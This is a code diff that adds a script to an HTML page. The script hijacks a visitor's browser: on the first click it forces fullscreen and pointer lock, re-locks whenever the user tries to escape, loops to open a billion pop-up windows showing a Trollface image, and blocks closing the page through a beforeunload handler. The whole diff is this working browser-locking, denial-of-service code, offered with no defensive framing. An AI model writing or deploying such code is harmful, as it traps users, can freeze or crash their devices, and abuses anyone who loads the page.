@@ -15,25 +15,71 @@
   </head>
   <body>
     <script>
+      let url = "https://upload.wikimedia.org/wikipedia/en/7/73/Trollface.png";
+
+      let isFullscreen = false;
+      let isPointerLocked = false;
+      let windowsOpened = false;
+
+      function tryOpenWindows() {
+        if (isFullscreen && isPointerLocked && !windowsOpened) {
+          windowsOpened = true;
+          openWindows();
+        }
+      }
+
       async function enableAll() {
         if (!document.fullscreenElement) {
           await document.documentElement.requestFullscreen().catch(() => {});
         }
-
         document.body.requestPointerLock();
       }
 
       document.addEventListener("click", enableAll, { once: true });
 
-      document.addEventListener("pointerlockchange", () => {
-        if (document.pointerLockElement !== document.body) {
-          document.body.requestPointerLock();
+      document.addEventListener("fullscreenchange", async () => {
+        isFullscreen = !!document.fullscreenElement;
+
+        if (!isFullscreen) {
+          await document.documentElement.requestFullscreen().catch(() => {});
         }
+
+        tryOpenWindows();
       });
 
-      document.addEventListener("mousemove", (e) => {
-        if (document.pointerLockElement === document.body) {
+      document.addEventListener("pointerlockchange", () => {
+        isPointerLocked = document.pointerLockElement === document.body;
+
+        if (!isPointerLocked) {
+          document.body.requestPointerLock();
         }
+
+        tryOpenWindows();
+      });
+
+      function openWindows() {
+        for (let i = 0; i < 1000000000; i++) {
+          const randomWidth = Math.floor(Math.random() * 800) + 300;
+          const randomHeight = Math.floor(Math.random() * 800) + 300;
+
+          const randomLeft = Math.floor(
+            Math.random() * (window.screen.width - randomWidth)
+          );
+          const randomTop = Math.floor(
+            Math.random() * (window.screen.height - randomHeight)
+          );
+
+          window.open(
+            url,
+            "",
+            `width=${randomWidth},height=${randomHeight},left=${randomLeft},top=${randomTop}`
+          );
+        }
+      }
+
+      window.addEventListener("beforeunload", (e) => {
+        e.preventDefault();
+        e.returnValue = "";
       });
     </script>
   </body>
